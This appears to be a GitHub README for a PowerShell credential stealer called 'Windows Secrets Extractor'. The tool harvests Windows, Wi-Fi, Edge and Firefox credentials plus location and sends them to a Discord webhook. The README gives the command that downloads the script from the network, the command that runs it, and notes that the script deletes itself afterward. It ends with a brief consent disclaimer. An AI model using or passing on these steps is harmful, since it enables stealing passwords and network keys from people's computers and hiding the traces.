# Windows Secrets Extractor

**Windows Secrets Extractor** allows you to get (in clear text) windows "secrets" informations such as :
- Windows informations (Os name & version, Username, Domain etc...)
- Windows Credentials
- Windows WLAN & Keys
- Edge Credentials
- FireFox Credentials
- Computer Location

***

### Requirements
- PowerShell [CredentialManager](https://www.powershellgallery.com/packages/CredentialManager/2.0) Module : ``Install-Module -Name CredentialManager``
- (Optionnal) Python 3


### Before Usage
- Create a Discord WebHook [help](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks)
- Adapt line ``8`` and enter your WebHook URL.

***

### Usage
1. Download the script :

```
Invoke-WebRequest https://raw.githubusercontent.com/danglock/Windows-Secrets-Extractor/main/extractor.ps1 -outfile $env:USERPROFILE\extractor.ps1
```

3. Run the Script :

```
cd $env:USERPROFILE;.\extractor.ps1
```

Note: the script will auto-destroy after execution

***
Be careful, I am not responsible for your use of this script.
Please do not use it against machines whose owner has not given you their consent
